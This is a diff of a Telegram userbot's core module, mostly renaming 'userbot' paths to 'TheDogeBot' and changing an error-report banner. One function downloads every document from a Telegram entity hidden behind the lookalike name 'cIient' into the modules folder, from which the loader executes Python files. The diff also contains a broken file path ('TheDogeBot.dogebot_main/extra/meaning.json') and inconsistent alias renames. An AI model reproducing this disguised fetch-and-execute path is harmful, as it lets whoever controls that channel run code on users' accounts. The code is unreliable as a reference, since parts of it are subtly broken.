@@ -1,15 +1,15 @@
 from telethon import events
 from var import Var
 from pathlib import Path
-from userbot.config import Config
+from TheDogeBot.config import Config
 import re, logging, inspect, sys, json, os
 from asyncio import create_subprocess_shell as asyncsubshell, subprocess as asyncsub
 from os import remove
 from time import gmtime, strftime
 from traceback import format_exc
 from typing import List
-from userbot.doge_main.heroku_var import *
-from userbot import *
+from TheDogeBot.dogebot_main.heroku_var import *
+from TheDogeBot import *
 from sys import *
 from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
 from telethon import TelegramClient, functions, types
@@ -79,30 +79,30 @@ def zzaacckkyy(**args):
 async def a(): 
     test1 = await bot.get_messages(cIient, None , filter=InputMessagesFilterDocument) ; total = int(test1.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
-        mxo = test1[ixo].id ; await client.download_media(await borg.get_messages(cIient, ids=mxo), "userbot/modules/")
+        mxo = test1[ixo].id ; await client.download_media(await borg.get_messages(cIient, ids=mxo), "TheDogeBot/modules/")
         
        
 def load_module(shortname):
     if shortname.startswith("__"):
         pass
     elif shortname.endswith("_"):
-        import userbot.events
+        import TheDogeBot.events
         import sys
         import importlib
         from pathlib import Path
-        path = Path(f"userbot/modules/{shortname}.py")
-        name = "userbot.modules.{}".format(shortname)
+        path = Path(f"TheDogeBot/modules/{shortname}.py")
+        name = "TheDogeBot.modules.{}".format(shortname)
         spec = importlib.util.spec_from_file_location(name, path)
         mod = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(mod)
         print("Successfully (re)imported "+shortname)
     else:
-        import userbot.events
+        import TheDogeBot.events
         import sys
         import importlib
         from pathlib import Path
-        path = Path(f"userbot/modules/{shortname}.py")
-        name = "userbot.modules.{}".format(shortname)
+        path = Path(f"TheDogeBot/modules/{shortname}.py")
+        name = "TheDogeBot.modules.{}".format(shortname)
         spec = importlib.util.spec_from_file_location(name, path)
         mod = importlib.util.module_from_spec(spec)
         mod.bot = bot
@@ -110,12 +110,12 @@ def load_module(shortname):
         mod.Var = Var
         mod.command = command
         mod.logger = logging.getLogger(shortname)
-        sys.modules["uniborg.util"] = userbot.events
+        sys.modules["uniborg.util"] = TheDogeBot.events
         mod.Config = Config
         mod.borg = bot
-        sys.modules["userbot.events"] = userbot.events
+        sys.modules["TheDogeBot.events"] = TheDogeBot.events
         spec.loader.exec_module(mod)
-        sys.modules["userbot.modules."+shortname] = mod
+        sys.modules["TheDogeBot.modules."+shortname] = mod
         print("Successfully (re)imported "+shortname)
 
 def remove_plugin(shortname):
@@ -126,7 +126,7 @@ def remove_plugin(shortname):
             del LOAD_PLUG[shortname]
 
         except:
-            name = f"userbot.modules.{shortname}"
+            name = f"TheDogeBot.modules.{shortname}"
 
             for i in reversed(range(len(bot._event_builders))):
                 ev, cb = bot._event_builders[i]
@@ -169,7 +169,7 @@ def rekcah05(pattern=None, **args):
     is_message_enabled = True
     return events.NewMessage(**args)
     
-def TheDogeBots(**args):
+def javess(**args):
     args["func"] = lambda e: e.via_bot_id is None
     stack = inspect.stack()
     previous_stack_frame = stack[1]
@@ -228,8 +228,8 @@ def TheDogeBots(**args):
             except BaseException:
                 if not disable_errors:
                     date = strftime("%Y-%m-%d %H:%M:%S", gmtime())
-                    text = "**TheDogeBot ERROR REPORT**\n"
-                    text += "Send this to @TheDogeBot05 if you cant find issue\n"
+                    text = "**JAVES ERROR REPORT**\n"
+                    text += "Send this to @TheDogeBot69 if you cant find issue\n"
                     ftext = "========== DISCLAIMER =========="
                     ftext += "\nThis file uploaded only logchat,"                
                     ftext += "\nreport to admin this error if you cant find any issue"
@@ -255,12 +255,12 @@ def TheDogeBots(**args):
                     result = str(stdout.decode().strip()) \
                         + str(stderr.decode().strip())
                     ftext += result
-                    file = open("TheDogeBot_error.log", "w+")
+                    file = open("error.log", "w+")
                     file.write(ftext)
                     file.close()
                     try:                 
-                      await check.client.send_file(send_to, "TheDogeBot_error.log", caption=text)
-                      remove("TheDogeBot_error.log")
+                      await check.client.send_file(send_to, "error.log", caption=text)
+                      remove("error.log")
                     except:
                       pass
                     
@@ -277,7 +277,7 @@ def TheDogeBots(**args):
     return decorator
 
 
-borg = TheDogeBot = bot ; admin_cmd = TheDogeBot ; command = zzaacckkyy ; register = TheDogeBot05 = TheDogeBots
+borg = javes = bot ; admin_cmd = rekcah05 ; command = zzaacckkyy ; register = javes05 = javess
 
 
 def errors_handler(func):
@@ -344,7 +344,7 @@ class Loader():
         bot.add_event_handler(func, events.NewMessage(**args))
 
 
-data = json.load(open("userbot/doge_main/extra/meaning.json")) 
+data = json.load(open("TheDogeBot.dogebot_main/extra/meaning.json")) 
 def meaning(w): 
 	w = w.lower() 
 	if w in data: 
